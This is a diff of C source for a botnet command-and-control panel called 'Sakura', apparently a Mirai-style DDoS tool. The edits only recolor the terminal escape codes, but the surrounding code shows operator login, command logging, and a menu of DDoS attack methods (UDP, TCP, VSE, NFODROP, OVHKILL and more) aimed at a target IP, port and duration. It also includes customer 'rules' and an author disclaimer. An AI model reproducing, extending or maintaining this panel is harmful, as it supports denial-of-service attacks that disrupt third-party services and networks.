@@ -233,7 +233,7 @@ void broadcast(char *msg, int us, char *sender)
                 if(i == us || (!clients[i].connected)) continue;
                 if(sendMGM && managements[i].connected)
                 {
-                        send(i, "\e[1;95m", 9, MSG_NOSIGNAL);
+                        send(i, "\e[40;38;2;171;143;255m", 9, MSG_NOSIGNAL);
                         send(i, sender, strlen(sender), MSG_NOSIGNAL);
                         send(i, ": ", 2, MSG_NOSIGNAL);
                 }
@@ -306,7 +306,7 @@ void *BotWorker(void *sock) {
 		sprintf(clearscreen, "\033[1A");
 		char user [5000];
 
-        sprintf(user, "\e[1;95mUsername\e[0m: \e[0m");
+        sprintf(user, "\e[40;38;2;171;143;255mUsername\e[0m: \e[0m");
 
 		if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
         if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
@@ -317,7 +317,7 @@ void *BotWorker(void *sock) {
         find_line = Find_Login(nickstring);
         if(strcmp(nickstring, accounts[find_line].username) == 0){
 		char password [5000];
-        sprintf(password, "\e[1;95mPassword\e[0m: \e[30m", accounts[find_line].username);
+        sprintf(password, "\e[40;38;2;171;143;255mPassword\e[0m: \e[30m", accounts[find_line].username);
 		if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;
 
         if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
@@ -353,9 +353,9 @@ void *TitleWriter(void *sock) {
 
   		sprintf(Sakura_banner0,   "\033[2J\033[1;1H");
   		sprintf(Sakura_banner1,  "\e[0m\r\n");
-  		sprintf(Sakura_banner2,  "\e[1;95m╔═╗  ╔═╗  ╦╔═  ╦ ╦  ╦═╗  ╔═╗\e[0m\r\n");
-  		sprintf(Sakura_banner3,  "\e[1;95m╚═╗  ╠═╣  ╠╩╗  ║ ║  ╠╦╝  ╠═╣\e[0m Type \e[1;95mHELP\e[0m For Help.\e[0m\r\n");
-  		sprintf(Sakura_banner4,  "\e[1;95m╚═╝  ╩ ╩  ╩ ╩  ╚═╝  ╩╚═  ╩ ╩\e[0m\r\n");
+  		sprintf(Sakura_banner2,  "\e[40;38;2;171;143;255m╔═╗  ╔═╗  ╦╔═  ╦ ╦  ╦═╗  ╔═╗\e[0m\r\n");
+  		sprintf(Sakura_banner3,  "\e[40;38;2;171;143;255m╚═╗  ╠═╣  ╠╩╗  ║ ║  ╠╦╝  ╠═╣\e[0m Type \e[40;38;2;171;143;255mHELP\e[0m For Help.\e[0m\r\n");
+  		sprintf(Sakura_banner4,  "\e[40;38;2;171;143;255m╚═╝  ╩ ╩  ╩ ╩  ╚═╝  ╩╚═  ╩ ╩\e[0m\r\n");
   		sprintf(Sakura_banner5,  "\e[0m\r\n");
 
   		if(send(datafd, Sakura_banner0, strlen(Sakura_banner0), MSG_NOSIGNAL) == -1) goto end;
@@ -366,7 +366,7 @@ void *TitleWriter(void *sock) {
   		if(send(datafd, Sakura_banner5, strlen(Sakura_banner5), MSG_NOSIGNAL) == -1) goto end;
 		while(1) {
 		char input [5000];
-        sprintf(input, "\e[0m[\e[1;95mSakura\e[0m]~: \e[0m");
+        sprintf(input, "\e[0m[\e[40;38;2;171;143;255mSakura\e[0m]~: \e[0m");
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 		break;
 		}
@@ -385,14 +385,14 @@ void *TitleWriter(void *sock) {
 				char help7  [800];
 				char help8  [800];
 //Made By Zinqo.
-        		sprintf(help1, "\e[1;95m╔═══════════════════════════════════════╗\e[0m\r\n");
-        		sprintf(help2, "\e[1;95m║\e[0m \e[1;95mATTACK\e[0m - Shows Attack Commands.       \e[1;95m║\e[0m\r\n");
-        		sprintf(help3, "\e[1;95m║\e[0m \e[1;95mSTATS\e[0m - Shows Server Stats.           \e[1;95m║\e[0m\r\n");
-        		sprintf(help4, "\e[1;95m║\e[0m \e[1;95mRULES\e[0m - Shows Rules.                  \e[1;95m║\e[0m\r\n");
-        		sprintf(help5, "\e[1;95m║\e[0m \e[1;95mINFO\e[0m - Shows Info.                    \e[1;95m║\e[0m\r\n");
-        		sprintf(help6, "\e[1;95m║\e[0m \e[1;95mCLEAR\e[0m - Clears Screen Back To Banner. \e[1;95m║\e[0m\r\n");
-        		sprintf(help7, "\e[1;95m║\e[0m \e[1;95mEXIT\e[0m - Exits Out Of Server.           \e[1;95m║\e[0m\r\n");
-        		sprintf(help8, "\e[1;95m╚═══════════════════════════════════════╝\e[0m\r\n");
+        		sprintf(help1, "\e[40;38;2;171;143;255m╔═══════════════════════════════════════╗\e[0m\r\n");
+        		sprintf(help2, "\e[40;38;2;171;143;255m║\e[0m \e[40;38;2;171;143;255mATTACK\e[0m - Shows Attack Commands.       \e[40;38;2;171;143;255m║\e[0m\r\n");
+        		sprintf(help3, "\e[40;38;2;171;143;255m║\e[0m \e[40;38;2;171;143;255mSTATS\e[0m - Shows Server Stats.           \e[40;38;2;171;143;255m║\e[0m\r\n");
+        		sprintf(help4, "\e[40;38;2;171;143;255m║\e[0m \e[40;38;2;171;143;255mRULES\e[0m - Shows Rules.                  \e[40;38;2;171;143;255m║\e[0m\r\n");
+        		sprintf(help5, "\e[40;38;2;171;143;255m║\e[0m \e[40;38;2;171;143;255mINFO\e[0m - Shows Info.                    \e[40;38;2;171;143;255m║\e[0m\r\n");
+        		sprintf(help6, "\e[40;38;2;171;143;255m║\e[0m \e[40;38;2;171;143;255mCLEAR\e[0m - Clears Screen Back To Banner. \e[40;38;2;171;143;255m║\e[0m\r\n");
+        		sprintf(help7, "\e[40;38;2;171;143;255m║\e[0m \e[40;38;2;171;143;255mEXIT\e[0m - Exits Out Of Server.           \e[40;38;2;171;143;255m║\e[0m\r\n");
+        		sprintf(help8, "\e[40;38;2;171;143;255m╚═══════════════════════════════════════╝\e[0m\r\n");
 
 				if(send(datafd, help1,  strlen(help1), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, help2,  strlen(help2), MSG_NOSIGNAL) == -1) goto end;
@@ -405,7 +405,7 @@ void *TitleWriter(void *sock) {
 
 				pthread_create(&title, NULL, &TitleWriter, sock);
 		char input [5000];
-        sprintf(input, "\e[0m[\e[1;95mSakura\e[0m]~: \e[0m");
+        sprintf(input, "\e[0m[\e[40;38;2;171;143;255mSakura\e[0m]~: \e[0m");
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 				continue;
 			}
@@ -419,12 +419,12 @@ void *TitleWriter(void *sock) {
 				char info5  [800];
 				char info6  [800];
 
-            	sprintf(info1, "\e[1;95m╔═════════════════════════════════════════════════════════════════╗\e[0m\r\n");
-            	sprintf(info2, "\e[1;95m║\e[0m This Source Was Made By Me... My Name Is Zinqo AKA Big Daddy.   \e[1;95m║\e[0m\r\n");
-            	sprintf(info3, "\e[1;95m║\e[0m I Did Not Make Any Of The Methods In This Source.               \e[1;95m║\e[0m\r\n");
-            	sprintf(info4, "\e[1;95m║\e[0m I Am Not In Charge With Any DDOS Attacks Sent With This Source. \e[1;95m║\e[0m\r\n");
-            	sprintf(info5, "\e[1;95m║\e[0m I Finished This Source On September 16th, 2020.                 \e[1;95m║\e[0m\r\n");
-            	sprintf(info6, "\e[1;95m╚═════════════════════════════════════════════════════════════════╝\e[0m\r\n");
+            	sprintf(info1, "\e[40;38;2;171;143;255m╔═════════════════════════════════════════════════════════════════╗\e[0m\r\n");
+            	sprintf(info2, "\e[40;38;2;171;143;255m║\e[0m This Source Was Made By Me... My Name Is Zinqo AKA Big Daddy.   \e[40;38;2;171;143;255m║\e[0m\r\n");
+            	sprintf(info3, "\e[40;38;2;171;143;255m║\e[0m I Did Not Make Any Of The Methods In This Source.               \e[40;38;2;171;143;255m║\e[0m\r\n");
+            	sprintf(info4, "\e[40;38;2;171;143;255m║\e[0m I Am Not In Charge With Any DDOS Attacks Sent With This Source. \e[40;38;2;171;143;255m║\e[0m\r\n");
+            	sprintf(info5, "\e[40;38;2;171;143;255m║\e[0m I Finished This Source On September 16th, 2020.                 \e[40;38;2;171;143;255m║\e[0m\r\n");
+            	sprintf(info6, "\e[40;38;2;171;143;255m╚═════════════════════════════════════════════════════════════════╝\e[0m\r\n");
 
 				if(send(datafd, info1,  strlen(info1), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, info2,  strlen(info2), MSG_NOSIGNAL) == -1) goto end;
@@ -435,7 +435,7 @@ void *TitleWriter(void *sock) {
 
 				pthread_create(&title, NULL, &TitleWriter, sock);//Made By Zinqo.
 		char input [5000];
-        sprintf(input, "\e[0m[\e[1;95mSakura\e[0m]~: \e[0m");
+        sprintf(input, "\e[0m[\e[40;38;2;171;143;255mSakura\e[0m]~: \e[0m");
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 				continue;
 			}
@@ -449,13 +449,13 @@ void *TitleWriter(void *sock) {
 				char rules6  [800];
 				char rules7  [800];
 
-                sprintf(rules1, "\e[1;95m╔═══════════════════════════════════════════╗\e[0m\r\n");
-                sprintf(rules2, "\e[1;95m║\e[0m 1. No Attacks Over 1200 Seconds.          \e[1;95m║\e[0m\r\n");
-                sprintf(rules3, "\e[1;95m║\e[0m 2. No Spamming Attacks.                   \e[1;95m║\e[0m\r\n");
-                sprintf(rules4, "\e[1;95m║\e[0m 3. No Attacks To Any Government Websites. \e[1;95m║\e[0m\r\n");
-                sprintf(rules5, "\e[1;95m║\e[0m 4. No Sharing Logins.                     \e[1;95m║\e[0m\r\n");
-                sprintf(rules6, "\e[1;95m║\e[0m 5. No Giving Out The Server IP.           \e[1;95m║\e[0m\r\n");
-                sprintf(rules7, "\e[1;95m╚═══════════════════════════════════════════╝\e[0m\r\n");
+                sprintf(rules1, "\e[40;38;2;171;143;255m╔═══════════════════════════════════════════╗\e[0m\r\n");
+                sprintf(rules2, "\e[40;38;2;171;143;255m║\e[0m 1. No Attacks Over 1200 Seconds.          \e[40;38;2;171;143;255m║\e[0m\r\n");
+                sprintf(rules3, "\e[40;38;2;171;143;255m║\e[0m 2. No Spamming Attacks.                   \e[40;38;2;171;143;255m║\e[0m\r\n");
+                sprintf(rules4, "\e[40;38;2;171;143;255m║\e[0m 3. No Attacks To Any Government Websites. \e[40;38;2;171;143;255m║\e[0m\r\n");
+                sprintf(rules5, "\e[40;38;2;171;143;255m║\e[0m 4. No Sharing Logins.                     \e[40;38;2;171;143;255m║\e[0m\r\n");
+                sprintf(rules6, "\e[40;38;2;171;143;255m║\e[0m 5. No Giving Out The Server IP.           \e[40;38;2;171;143;255m║\e[0m\r\n");
+                sprintf(rules7, "\e[40;38;2;171;143;255m╚═══════════════════════════════════════════╝\e[0m\r\n");
 
 				if(send(datafd, rules1,  strlen(rules1), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, rules2,  strlen(rules2), MSG_NOSIGNAL) == -1) goto end;
@@ -467,7 +467,7 @@ void *TitleWriter(void *sock) {
 
 				pthread_create(&title, NULL, &TitleWriter, sock);
 		char input [5000];
-        sprintf(input, "\e[0m[\e[1;95mSakura\e[0m]~: \e[0m");
+        sprintf(input, "\e[0m[\e[40;38;2;171;143;255mSakura\e[0m]~: \e[0m");
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 				continue;
 			}//Made By Zinqo.
@@ -487,19 +487,19 @@ void *TitleWriter(void *sock) {
 				char attackc  [800];
 				char attackd  [800];
 //Made By Zinqo.
-        		sprintf(attack1,  "\e[1;95m╔════════════════════════════════════════════════════╗\e[0m\r\n");
-        		sprintf(attack2,  "\e[1;95m║\e[0m \e[1;95m!\e[0m \e[1;95mUDP\e[0m [\e[1;95mIP\e[0m] [\e[1;95mPORT\e[0m] [\e[1;95mTIME\e[0m] \e[1;95m32\e[0m \e[1;95m0\e[0m \e[1;95m10\e[0m                   \e[1;95m║\e[0m\r\n");
-        		sprintf(attack3,  "\e[1;95m║\e[0m \e[1;95m!\e[0m \e[1;95mTCP\e[0m [\e[1;95mIP\e[0m] [\e[1;95mPORT\e[0m] [\e[1;95mTIME\e[0m] \e[1;95m32\e[0m [\e[1;95mFLAGS\e[0m(\e[1;95mALL\e[0m)] \e[1;95m0\e[0m \e[1;95m10\e[0m      \e[1;95m║\e[0m\r\n");
-        		sprintf(attack4,  "\e[1;95m║\e[0m \e[1;95m!\e[0m \e[1;95mSTD\e[0m [\e[1;95mIP\e[0m] [\e[1;95mPORT\e[0m] [\e[1;95mTIME\e[0m]                           \e[1;95m║\e[0m\r\n");
-        		sprintf(attack5,  "\e[1;95m║\e[0m \e[1;95m!\e[0m \e[1;95mSTDHEX\e[0m [\e[1;95mIP\e[0m] [\e[1;95mPORT\e[0m] [\e[1;95mTIME\e[0m]                        \e[1;95m║\e[0m\r\n");
-        		sprintf(attack6,  "\e[1;95m║\e[0m \e[1;95m!\e[0m \e[1;95mVSE\e[0m [\e[1;95mIP\e[0m] [\e[1;95mPORT\e[0m] [\e[1;95mTIME\e[0m] \e[1;95m32\e[0m \e[1;95m1024\e[0m \e[1;95m10\e[0m                \e[1;95m║\e[0m\r\n");
-        		sprintf(attack7,  "\e[1;95m║\e[0m \e[1;95m!\e[0m \e[1;95mXMAS\e[0m [\e[1;95mIP\e[0m] [\e[1;95mPORT\e[0m] [\e[1;95mTIME\e[0m]                          \e[1;95m║\e[0m\r\n");
-        		sprintf(attack8,  "\e[1;95m║\e[0m \e[1;95m!\e[0m \e[1;95mCRUSH\e[0m [\e[1;95mIP\e[0m] [\e[1;95mPORT\e[0m] [\e[1;95mTIME\e[0m] \e[1;95m32\e[0m [\e[1;95mFLAGS\e[0m(\e[1;95mALL\e[0m)] \e[1;95m10\e[0m \e[1;95m1024\e[0m \e[1;95m║\e[0m\r\n");//Made By Zinqo.
-        		sprintf(attack9,  "\e[1;95m║\e[0m \e[1;95m!\e[0m \e[1;95mSTOMP\e[0m [\e[1;95mIP\e[0m] [\e[1;95mPORT\e[0m] [\e[1;95mTIME\e[0m] \e[1;95m32\e[0m [\e[1;95mFLAGS\e[0m(\e[1;95mALL\e[0m)] \e[1;95m10\e[0m \e[1;95m1024\e[0m \e[1;95m║\e[0m\r\n");
-        		sprintf(attacka,  "\e[1;95m║\e[0m \e[1;95m!\e[0m \e[1;95mNFODROP\e[0m [\e[1;95mIP\e[0m] [\e[1;95mPORT\e[0m] [\e[1;95mTIME\e[0m]                       \e[1;95m║\e[0m\r\n");
-        		sprintf(attackb,  "\e[1;95m║\e[0m \e[1;95m!\e[0m \e[1;95mOVHKILL\e[0m [\e[1;95mIP\e[0m] [\e[1;95mPORT\e[0m] [\e[1;95mTIME\e[0m]                       \e[1;95m║\e[0m\r\n");
-        		sprintf(attackc,  "\e[1;95m║\e[0m \e[1;95m!\e[0m \e[1;95mSTOP\e[0m                                             \e[1;95m║\e[0m\r\n");
-        		sprintf(attackd,  "\e[1;95m╚════════════════════════════════════════════════════╝\e[0m\r\n");
+        		sprintf(attack1,  "\e[40;38;2;171;143;255m╔════════════════════════════════════════════════════╗\e[0m\r\n");
+        		sprintf(attack2,  "\e[40;38;2;171;143;255m║\e[0m \e[40;38;2;171;143;255m!\e[0m \e[40;38;2;171;143;255mUDP\e[0m [\e[40;38;2;171;143;255mIP\e[0m] [\e[40;38;2;171;143;255mPORT\e[0m] [\e[40;38;2;171;143;255mTIME\e[0m] \e[40;38;2;171;143;255m32\e[0m \e[40;38;2;171;143;255m0\e[0m \e[40;38;2;171;143;255m10\e[0m                   \e[40;38;2;171;143;255m║\e[0m\r\n");
+        		sprintf(attack3,  "\e[40;38;2;171;143;255m║\e[0m \e[40;38;2;171;143;255m!\e[0m \e[40;38;2;171;143;255mTCP\e[0m [\e[40;38;2;171;143;255mIP\e[0m] [\e[40;38;2;171;143;255mPORT\e[0m] [\e[40;38;2;171;143;255mTIME\e[0m] \e[40;38;2;171;143;255m32\e[0m [\e[40;38;2;171;143;255mFLAGS\e[0m(\e[40;38;2;171;143;255mALL\e[0m)] \e[40;38;2;171;143;255m0\e[0m \e[40;38;2;171;143;255m10\e[0m      \e[40;38;2;171;143;255m║\e[0m\r\n");
+        		sprintf(attack4,  "\e[40;38;2;171;143;255m║\e[0m \e[40;38;2;171;143;255m!\e[0m \e[40;38;2;171;143;255mSTD\e[0m [\e[40;38;2;171;143;255mIP\e[0m] [\e[40;38;2;171;143;255mPORT\e[0m] [\e[40;38;2;171;143;255mTIME\e[0m]                           \e[40;38;2;171;143;255m║\e[0m\r\n");
+        		sprintf(attack5,  "\e[40;38;2;171;143;255m║\e[0m \e[40;38;2;171;143;255m!\e[0m \e[40;38;2;171;143;255mSTDHEX\e[0m [\e[40;38;2;171;143;255mIP\e[0m] [\e[40;38;2;171;143;255mPORT\e[0m] [\e[40;38;2;171;143;255mTIME\e[0m]                        \e[40;38;2;171;143;255m║\e[0m\r\n");
+        		sprintf(attack6,  "\e[40;38;2;171;143;255m║\e[0m \e[40;38;2;171;143;255m!\e[0m \e[40;38;2;171;143;255mVSE\e[0m [\e[40;38;2;171;143;255mIP\e[0m] [\e[40;38;2;171;143;255mPORT\e[0m] [\e[40;38;2;171;143;255mTIME\e[0m] \e[40;38;2;171;143;255m32\e[0m \e[40;38;2;171;143;255m1024\e[0m \e[40;38;2;171;143;255m10\e[0m                \e[40;38;2;171;143;255m║\e[0m\r\n");
+        		sprintf(attack7,  "\e[40;38;2;171;143;255m║\e[0m \e[40;38;2;171;143;255m!\e[0m \e[40;38;2;171;143;255mXMAS\e[0m [\e[40;38;2;171;143;255mIP\e[0m] [\e[40;38;2;171;143;255mPORT\e[0m] [\e[40;38;2;171;143;255mTIME\e[0m]                          \e[40;38;2;171;143;255m║\e[0m\r\n");
+        		sprintf(attack8,  "\e[40;38;2;171;143;255m║\e[0m \e[40;38;2;171;143;255m!\e[0m \e[40;38;2;171;143;255mCRUSH\e[0m [\e[40;38;2;171;143;255mIP\e[0m] [\e[40;38;2;171;143;255mPORT\e[0m] [\e[40;38;2;171;143;255mTIME\e[0m] \e[40;38;2;171;143;255m32\e[0m [\e[40;38;2;171;143;255mFLAGS\e[0m(\e[40;38;2;171;143;255mALL\e[0m)] \e[40;38;2;171;143;255m10\e[0m \e[40;38;2;171;143;255m1024\e[0m \e[40;38;2;171;143;255m║\e[0m\r\n");//Made By Zinqo.
+        		sprintf(attack9,  "\e[40;38;2;171;143;255m║\e[0m \e[40;38;2;171;143;255m!\e[0m \e[40;38;2;171;143;255mSTOMP\e[0m [\e[40;38;2;171;143;255mIP\e[0m] [\e[40;38;2;171;143;255mPORT\e[0m] [\e[40;38;2;171;143;255mTIME\e[0m] \e[40;38;2;171;143;255m32\e[0m [\e[40;38;2;171;143;255mFLAGS\e[0m(\e[40;38;2;171;143;255mALL\e[0m)] \e[40;38;2;171;143;255m10\e[0m \e[40;38;2;171;143;255m1024\e[0m \e[40;38;2;171;143;255m║\e[0m\r\n");
+        		sprintf(attacka,  "\e[40;38;2;171;143;255m║\e[0m \e[40;38;2;171;143;255m!\e[0m \e[40;38;2;171;143;255mNFODROP\e[0m [\e[40;38;2;171;143;255mIP\e[0m] [\e[40;38;2;171;143;255mPORT\e[0m] [\e[40;38;2;171;143;255mTIME\e[0m]                       \e[40;38;2;171;143;255m║\e[0m\r\n");
+        		sprintf(attackb,  "\e[40;38;2;171;143;255m║\e[0m \e[40;38;2;171;143;255m!\e[0m \e[40;38;2;171;143;255mOVHKILL\e[0m [\e[40;38;2;171;143;255mIP\e[0m] [\e[40;38;2;171;143;255mPORT\e[0m] [\e[40;38;2;171;143;255mTIME\e[0m]                       \e[40;38;2;171;143;255m║\e[0m\r\n");
+        		sprintf(attackc,  "\e[40;38;2;171;143;255m║\e[0m \e[40;38;2;171;143;255m!\e[0m \e[40;38;2;171;143;255mSTOP\e[0m                                             \e[40;38;2;171;143;255m║\e[0m\r\n");
+        		sprintf(attackd,  "\e[40;38;2;171;143;255m╚════════════════════════════════════════════════════╝\e[0m\r\n");
 
 				if(send(datafd, attack1,  strlen(attack1),	MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, attack2,  strlen(attack2),	MSG_NOSIGNAL) == -1) goto end;
@@ -517,7 +517,7 @@ void *TitleWriter(void *sock) {
 
 				pthread_create(&title, NULL, &TitleWriter, sock);
 		char input [5000];
-        sprintf(input, "\e[0m[\e[1;95mSakura\e[0m]~: \e[0m");
+        sprintf(input, "\e[0m[\e[40;38;2;171;143;255mSakura\e[0m]~: \e[0m");
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 				continue;
  		}
@@ -534,7 +534,7 @@ void *TitleWriter(void *sock) {
 				if(send(datafd, onlineusers, strlen(onlineusers), MSG_NOSIGNAL) == -1) return;
 				if(send(datafd, userconnected, strlen(userconnected), MSG_NOSIGNAL) == -1) return;
 		char input [5000];
-        sprintf(input, "\e[0m[\e[1;95mSakura\e[0m]~: \e[0m");
+        sprintf(input, "\e[0m[\e[40;38;2;171;143;255mSakura\e[0m]~: \e[0m");
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 				continue;
 			}
@@ -554,7 +554,7 @@ void *TitleWriter(void *sock) {
 
 				while(1) {
 		char input [5000];//Made By Zinqo.
-        sprintf(input, "\e[0m[\e[1;95mSakura\e[0m]~: \e[0m");
+        sprintf(input, "\e[0m[\e[40;38;2;171;143;255mSakura\e[0m]~: \e[0m");
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
 				break;
 				}
@@ -621,10 +621,10 @@ void *TitleWriter(void *sock) {
         }
             trim(buf);
 		char input [5000];
-        sprintf(input, "\e[0m[\e[1;95mSakura\e[0m]~: \e[0m");
+        sprintf(input, "\e[0m[\e[40;38;2;171;143;255mSakura\e[0m]~: \e[0m");
 		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
             if(strlen(buf) == 0) continue;
-            printf("\e[1;95mUser: %s | Command: %s\e[0m\n", accounts[find_line].username, buf);
+            printf("\e[40;38;2;171;143;255mUser: %s | Command: %s\e[0m\n", accounts[find_line].username, buf);
 
 			FILE *logfile;
             logfile = fopen("Sakura_Logs.log", "a");
@@ -660,12 +660,12 @@ void *BotListener(int port) {
         pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);
 }}
 int main (int argc, char *argv[], void *sock) {
-	    printf("\e[1;95mSakura\e[0m\n");
+	    printf("\e[40;38;2;171;143;255mSakura\e[0m\n");
         signal(SIGPIPE, SIG_IGN);//Made By Zinqo.
         int s, threads, port;
         struct epoll_event event;
         if (argc != 4) {
-			fprintf (stderr, "\e[1;95mIncorrect Usage!\e[0m\n");
+			fprintf (stderr, "\e[40;38;2;171;143;255mIncorrect Usage!\e[0m\n");
 			exit (EXIT_FAILURE);
         }
 
